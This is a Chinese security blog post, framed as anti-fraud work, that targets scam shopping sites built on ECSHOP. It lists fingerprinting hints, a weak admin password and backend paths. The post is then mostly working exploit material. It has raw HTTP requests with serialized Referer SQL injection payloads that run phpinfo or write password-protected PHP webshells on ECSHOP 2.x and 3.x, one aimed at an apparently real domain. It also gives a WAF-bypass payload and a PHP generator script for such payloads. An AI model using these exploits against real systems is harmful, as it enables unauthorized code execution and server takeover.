<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>购物诈骗_1 | bo0s</title>
  <meta name="author" content="hitman">
  
  <meta name="description" content="My Blog/Website, will Tutorials, and just my general thoughts.">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="购物诈骗_1"/>
  <meta property="og:site_name" content="bo0s"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/12favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 5.0.0"><link rel="stylesheet" href="/css/prism-vs.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">bo0s</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="全部文章">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="标签">
			  <i class="fa fa-tag"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="我是谁.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/wiki/#/" title="WiKi.">
			  <i class="fa fa-book"></i>WiKi
			</a>
		  </li>
		  
		  <li>
			<a href="/tool" title="工具">
			  <i class="fa fa-space-shuttle"></i>Tool
			</a>
		  </li>
		  
		  <li>
			<a href="/logs" title="日志">
			  <i class="fa fa-tachometer"></i>Logs
			</a>
		  </li>
		  
		  <li>
			<a href="/code/landing/" title="Discord.JS Bot Code">
			  <i class="fa fa-code"></i>Tutorials / Code
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> 购物诈骗_1</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h4 id="特征识别"><a href="#特征识别" class="headerlink" title="特征识别"></a>特征识别</h4><p><img src="/images/pasted-116.png" alt="upload successful"></p>
<p><img src="/images/pasted-141.png" alt="upload successful"></p>
<a id="more"></a> 
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">推荐使用手机UA和移动端视图访问页面；</span><br></pre></td></tr></table></figure>
<p><img src="/images/pasted-118.png" alt="upload successful"></p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">## 后台登陆页面</span><br><span class="line">弱口令：admin/admin869</span><br></pre></td></tr></table></figure>
<p><img src="/images/pasted-117.png" alt="upload successful"></p>
<p><img src="/images/pasted-119.png" alt="upload successful"></p>
<h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 看ECSHOP版本</span></span><br><span class="line">view-source:http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>/</span><br><span class="line"></span><br><span class="line"><span class="comment">## 安装路径</span></span><br><span class="line">https:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/install/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 后台路径</span></span><br><span class="line">https:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/admin/</span>privilege.php?act=login</span><br><span class="line"></span><br><span class="line"><span class="comment">## ECSHOP(Poc一把梭)</span></span><br><span class="line">ECSHOP v2.<span class="number">7.3</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/pasted-120.png" alt="upload successful"></p>
<h5 id="前台漏洞"><a href="#前台漏洞" class="headerlink" title="前台漏洞"></a>前台漏洞</h5><h6 id="前台函数执行"><a href="#前台函数执行" class="headerlink" title="前台函数执行"></a>前台函数执行</h6><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## ECSHOP 2.x 前台执行phpinfo函数</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">GET</span> /user.php?act=login HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">127.0.0.1</span></span><br><span class="line"><span class="attribute">Cache</span>-Control: max-age=<span class="number">0</span></span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Macintosh; Intel Mac OS X <span class="number">10</span>_<span class="number">15</span>_<span class="number">7</span>) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">91</span>.<span class="number">0</span>.<span class="number">4472</span>.<span class="number">106</span> Safari/<span class="number">537</span>.<span class="number">36</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0</span>.<span class="number">8</span>,application/signed-exchange;v=b<span class="number">3</span>;q=<span class="number">0</span>.<span class="number">9</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">9</span>,en;q=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">Cookie</span>: ECS_ID=ba<span class="number">6704</span>f<span class="number">3</span>f<span class="number">9</span>fcefb<span class="number">4</span>f<span class="number">1788</span>a<span class="number">2</span>a<span class="number">92</span>b<span class="number">1</span>e<span class="number">26</span>a<span class="number">6</span>eae<span class="number">7033</span>; ECS[visit_times]=<span class="number">1</span>; ecsid=<span class="number">1</span>d<span class="number">15</span>e<span class="number">68353562066252340</span>a<span class="number">3</span>b<span class="number">9215</span>fe<span class="number">90</span>c<span class="number">52</span>e<span class="number">422</span>; PHPSESSID=ucqviu<span class="number">126</span>unbojvob<span class="number">9</span>i<span class="number">6</span>tfc<span class="number">0</span>r<span class="number">2</span>; ECSCP_ID=<span class="number">63</span>df<span class="number">7</span>cee<span class="number">01</span>eca<span class="number">34</span>f<span class="number">3</span>bcd<span class="number">84</span>fb<span class="number">10</span>be<span class="number">636</span>b<span class="number">6</span>af<span class="number">383</span>eb; CL_ECSCP_ID=<span class="number">0000514686544542502</span>c<span class="number">39</span>aff<span class="number">85</span>b<span class="number">57</span>a<span class="number">11</span>d<span class="number">03</span>d<span class="number">54</span>e</span><br><span class="line"><span class="attribute">Referer</span>: <span class="number">554</span>fcae<span class="number">493</span>e<span class="number">564</span>ee<span class="number">0</span>dc<span class="number">75</span>bdf<span class="number">2</span>ebf<span class="number">94</span>caads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;num&quot;</span>;s:<span class="number">110</span>:<span class="string">&quot;*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;&#x27; /*&quot;</span>;&#125;<span class="number">554</span>fcae<span class="number">493</span>e<span class="number">564</span>ee<span class="number">0</span>dc<span class="number">75</span>bdf<span class="number">2</span>ebf<span class="number">94</span>ca</span><br><span class="line"><span class="attribute">x</span>-forwarded-for: <span class="number">127.0.0.1</span></span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure>

<p><img src="/images/pasted-121.png" alt="upload successful"></p>
<h6 id="前台Getshell"><a href="#前台Getshell" class="headerlink" title="前台Getshell"></a>前台Getshell</h6><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## ECSHOP 2.x 前台Getshell</span></span><br><span class="line"><span class="comment">## 生成的shell如下所示</span></span><br><span class="line"><span class="attribute">https</span>://<span class="number">127.0.0.1</span>/z.php   //密码：<span class="number">9527</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">GET</span> /user.php?act=login HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: sitianjz.cn</span><br><span class="line"><span class="attribute">Cache</span>-Control: max-age=<span class="number">0</span></span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Macintosh; Intel Mac OS X <span class="number">10</span>_<span class="number">15</span>_<span class="number">7</span>) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">91</span>.<span class="number">0</span>.<span class="number">4472</span>.<span class="number">106</span> Safari/<span class="number">537</span>.<span class="number">36</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0</span>.<span class="number">8</span>,application/signed-exchange;v=b<span class="number">3</span>;q=<span class="number">0</span>.<span class="number">9</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">9</span>,en;q=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">Cookie</span>: ECS_ID=ba<span class="number">6704</span>f<span class="number">3</span>f<span class="number">9</span>fcefb<span class="number">4</span>f<span class="number">1788</span>a<span class="number">2</span>a<span class="number">92</span>b<span class="number">1</span>e<span class="number">26</span>a<span class="number">6</span>eae<span class="number">7033</span>; ECS[visit_times]=<span class="number">1</span>; ecsid=<span class="number">1</span>d<span class="number">15</span>e<span class="number">68353562066252340</span>a<span class="number">3</span>b<span class="number">9215</span>fe<span class="number">90</span>c<span class="number">52</span>e<span class="number">422</span>; PHPSESSID=ucqviu<span class="number">126</span>unbojvob<span class="number">9</span>i<span class="number">6</span>tfc<span class="number">0</span>r<span class="number">2</span>; ECSCP_ID=<span class="number">63</span>df<span class="number">7</span>cee<span class="number">01</span>eca<span class="number">34</span>f<span class="number">3</span>bcd<span class="number">84</span>fb<span class="number">10</span>be<span class="number">636</span>b<span class="number">6</span>af<span class="number">383</span>eb; CL_ECSCP_ID=<span class="number">0000514686544542502</span>c<span class="number">39</span>aff<span class="number">85</span>b<span class="number">57</span>a<span class="number">11</span>d<span class="number">03</span>d<span class="number">54</span>e</span><br><span class="line"><span class="attribute">Referer</span>: <span class="number">554</span>fcae<span class="number">493</span>e<span class="number">564</span>ee<span class="number">0</span>dc<span class="number">75</span>bdf<span class="number">2</span>ebf<span class="number">94</span>caads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;num&quot;</span>;s:<span class="number">280</span>:<span class="string">&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a336f75634768774a79776e50443977614841675a585a686243676b58314250553152624f5455794e3130704f79412f506963702729293b2f2f7d787878,10-- -&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;&#x27;/*&quot;</span>;&#125;</span><br><span class="line"><span class="attribute">x</span>-originating-ip: <span class="number">127.0.0.1</span></span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure>

<p><img src="/images/pasted-122.png" alt="upload successful"></p>
<h6 id="ECSHOP-3-x-函数执行"><a href="#ECSHOP-3-x-函数执行" class="headerlink" title="ECSHOP 3.x 函数执行"></a>ECSHOP 3.x 函数执行</h6><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## phpinfo():</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">Referer</span>: <span class="number">45</span>ea<span class="number">207</span>d<span class="number">7</span>a<span class="number">2</span>b<span class="number">68</span>c<span class="number">49582</span>d<span class="number">2</span>d<span class="number">22</span>adf<span class="number">953</span>aads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;num&quot;</span>;s:<span class="number">107</span>:<span class="string">&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;-1&#x27; UNION/*&quot;</span>;&#125;<span class="number">45</span>ea<span class="number">207</span>d<span class="number">7</span>a<span class="number">2</span>b<span class="number">68</span>c<span class="number">49582</span>d<span class="number">2</span>d<span class="number">22</span>adf<span class="number">953</span>a</span><br></pre></td></tr></table></figure>

<h6 id="ECSHOP-3-x-getshell"><a href="#ECSHOP-3-x-getshell" class="headerlink" title="ECSHOP 3.x getshell"></a>ECSHOP 3.x getshell</h6><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## webshell：</span></span><br><span class="line"><span class="comment">## https://127.0.0.1/1.php //密码:1337</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">Referer</span>: <span class="number">45</span>ea<span class="number">207</span>d<span class="number">7</span>a<span class="number">2</span>b<span class="number">68</span>c<span class="number">49582</span>d<span class="number">2</span>d<span class="number">22</span>adf<span class="number">953</span>aads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;num&quot;</span>;s:<span class="number">289</span>:<span class="string">&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;-1&#x27; UNION/*&quot;</span>;&#125;<span class="number">45</span>ea<span class="number">207</span>d<span class="number">7</span>a<span class="number">2</span>b<span class="number">68</span>c<span class="number">49582</span>d<span class="number">2</span>d<span class="number">22</span>adf<span class="number">953</span>a</span><br></pre></td></tr></table></figure>
<h6 id="ECSHOP-3-x-bypass-waf"><a href="#ECSHOP-3-x-bypass-waf" class="headerlink" title="ECSHOP 3.x bypass_waf"></a>ECSHOP 3.x bypass_waf</h6><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">## phpinfo()</span><br><span class="line"></span><br><span class="line">Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:&quot;num&quot;;S:88:&quot;*/<span class="symbol">\7</span>5<span class="symbol">\6</span>e<span class="symbol">\6</span>9<span class="symbol">\6</span>f<span class="symbol">\6</span>e<span class="symbol">\2</span>0<span class="symbol">\7</span>3<span class="symbol">\6</span>5<span class="symbol">\6</span>c<span class="symbol">\6</span>5<span class="symbol">\6</span>3<span class="symbol">\7</span>4<span class="symbol">\2</span>0<span class="symbol">\3</span>1<span class="symbol">\2</span>c<span class="symbol">\3</span>0<span class="symbol">\7</span>8<span class="symbol">\3</span>2<span class="symbol">\3</span>7<span class="symbol">\3</span>2<span class="symbol">\6</span>6<span class="symbol">\3</span>2<span class="symbol">\6</span>1<span class="symbol">\2</span>c<span class="symbol">\3</span>4<span class="symbol">\2</span>c<span class="symbol">\3</span>4<span class="symbol">\2</span>c<span class="symbol">\3</span>5<span class="symbol">\2</span>c<span class="symbol">\3</span>6<span class="symbol">\2</span>c<span class="symbol">\3</span>7<span class="symbol">\2</span>c<span class="symbol">\3</span>8<span class="symbol">\2</span>c<span class="symbol">\3</span>0<span class="symbol">\7</span>8<span class="symbol">\3</span>7<span class="symbol">\6</span>2<span class="symbol">\3</span>2<span class="symbol">\3</span>4<span class="symbol">\3</span>6<span class="symbol">\3</span>1<span class="symbol">\3</span>2<span class="symbol">\3</span>7<span class="symbol">\3</span>5<span class="symbol">\6</span>4<span class="symbol">\3</span>3<span class="symbol">\6</span>2<span class="symbol">\3</span>7<span class="symbol">\3</span>0<span class="symbol">\3</span>6<span class="symbol">\3</span>8<span class="symbol">\3</span>7<span class="symbol">\3</span>0<span class="symbol">\3</span>6<span class="symbol">\3</span>9<span class="symbol">\3</span>6<span class="symbol">\6</span>5<span class="symbol">\3</span>6<span class="symbol">\3</span>6<span class="symbol">\3</span>6<span class="symbol">\6</span>6<span class="symbol">\3</span>2<span class="symbol">\6</span>6<span class="symbol">\3</span>2<span class="symbol">\6</span>1<span class="symbol">\3</span>2<span class="symbol">\6</span>1<span class="symbol">\3</span>2<span class="symbol">\6</span>6<span class="symbol">\3</span>2<span class="symbol">\3</span>8<span class="symbol">\3</span>2<span class="symbol">\3</span>9<span class="symbol">\3</span>3<span class="symbol">\6</span>2<span class="symbol">\3</span>2<span class="symbol">\6</span>6<span class="symbol">\3</span>2<span class="symbol">\6</span>6<span class="symbol">\3</span>7<span class="symbol">\6</span>4<span class="symbol">\2</span>c<span class="symbol">\3</span>0&quot;;s:2:&quot;id&quot;;s:3:&quot;&#x27;/*&quot;;&#125;45ea207d7a2b68c49582d2d22adf953a</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## bypass生成脚本</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strToHex</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line">    $hex=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($string);$i++)</span><br><span class="line">    $hex.=dechex(ord($string[$i]));</span><br><span class="line">    $hex=strtolower($hex);</span><br><span class="line">    <span class="keyword">return</span> $hex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造poc</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">base_poc</span>(<span class="params">$payload</span>)</span>&#123;</span><br><span class="line">    $base_poc = <span class="string">&quot;&#123;\$a&#x27;];$payload//&#125;&quot;</span>;</span><br><span class="line">    $base_poc = strToHex($base_poc);</span><br><span class="line">    <span class="keyword">return</span> $base_poc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//生成referer</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">referer</span>(<span class="params">$base_poc</span>)</span>&#123;</span><br><span class="line">    $echash = <span class="string">&#x27;45ea207d7a2b68c49582d2d22adf953a&#x27;</span>;</span><br><span class="line">    $dyn_func = <span class="string">&#x27;ads&#x27;</span>;</span><br><span class="line">    $poc0 = <span class="keyword">array</span>(<span class="string">&#x27;num&#x27;</span>=&gt;<span class="string">&quot;*/union select 1,0x272f2a,4,4,5,6,7,8,0x$base_poc,0&quot;</span>,<span class="string">&#x27;id&#x27;</span>=&gt;<span class="string">&#x27;\&#x27;/*&#x27;</span>);</span><br><span class="line">    $serialize = serialize($poc0);</span><br><span class="line">    $referer = $echash.$dyn_func.<span class="string">&quot;|&quot;</span>.$serialize.$echash;</span><br><span class="line">    <span class="keyword">return</span> $referer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">construt_str</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    $res = <span class="keyword">array</span>(<span class="string">&quot;origin&quot;</span>=&gt;<span class="string">&#x27;&#x27;</span>,<span class="string">&quot;modified&quot;</span>=&gt;<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="comment">//截取字段num中的值</span></span><br><span class="line">    $poc_pos0 = strpos($str, <span class="string">&quot;union&quot;</span>);</span><br><span class="line">    $poc_pos1 = strrpos($str, <span class="string">&quot;,&quot;</span>)+<span class="number">2</span>;</span><br><span class="line">    $poc_len = $poc_pos1 - $poc_pos0;</span><br><span class="line">    $tmp_poc = substr($str, $poc_pos0,$poc_len);</span><br><span class="line">    <span class="comment">//后面替换时使用</span></span><br><span class="line">    $res[<span class="string">&#x27;origin&#x27;</span>] = $tmp_poc;</span><br><span class="line">    $res[<span class="string">&#x27;modified&#x27;</span>] = modify_str($tmp_poc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理字符串格式</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">modify_str</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    $str = strToHex($str);</span><br><span class="line"></span><br><span class="line">    $insert = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line">    $str_len = strlen($str);</span><br><span class="line">    <span class="keyword">if</span>($str_len % <span class="number">2</span> !== <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;The length of input string is wrong!&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i&lt;($str_len*<span class="number">3</span>/<span class="number">2</span>); $i=$i+<span class="number">3</span>)&#123;</span><br><span class="line">        $str = substr_replace($str, $insert, $i ,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replace</span>(<span class="params">$origin,$modified,$referer</span>)</span>&#123;</span><br><span class="line">    $res_poc = str_replace($origin, $modified, $referer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//使用 escaped binary string 模式</span></span><br><span class="line">    $pos = strpos($res_poc, <span class="string">&#x27;m&quot;;&#x27;</span>) + <span class="number">3</span>;</span><br><span class="line">    $res_poc[$pos] = <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> $res_poc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">poc</span>(<span class="params">$payload</span>)</span>&#123;</span><br><span class="line">    $base_poc = base_poc($payload);</span><br><span class="line">    $referer = referer($base_poc);</span><br><span class="line">    $tmp_res = construt_str($referer);</span><br><span class="line">    $res = replace($tmp_res[<span class="string">&#x27;origin&#x27;</span>], $tmp_res[<span class="string">&#x27;modified&#x27;</span>], $referer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    $payload = <span class="string">&quot;phpinfo/**/();&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> poc($payload).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
	  <div class="article-footer-copyright">

    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
</div>

	</div>

	
	<span id="/post/%E8%B4%AD%E7%89%A9%E8%AF%88%E9%AA%97-1/" class="leancloud-visitors view" data-flag-title="购物诈骗_1">
		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
	</span>
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/post/菠菜诈骗-6/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/post/菠菜诈骗-5/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>

    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2021-07-01 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/反诈打击/">反诈打击<span>71</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/菠菜类/">菠菜类<span>15</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2024 hitman's Blog
  
      . wubba <a href="http://hexo.io/" target="_blank">lubba</a> dub <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank"> dub.</a>  
</p>

 </footer>
</div> <!-- container-narrow -->
  



  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


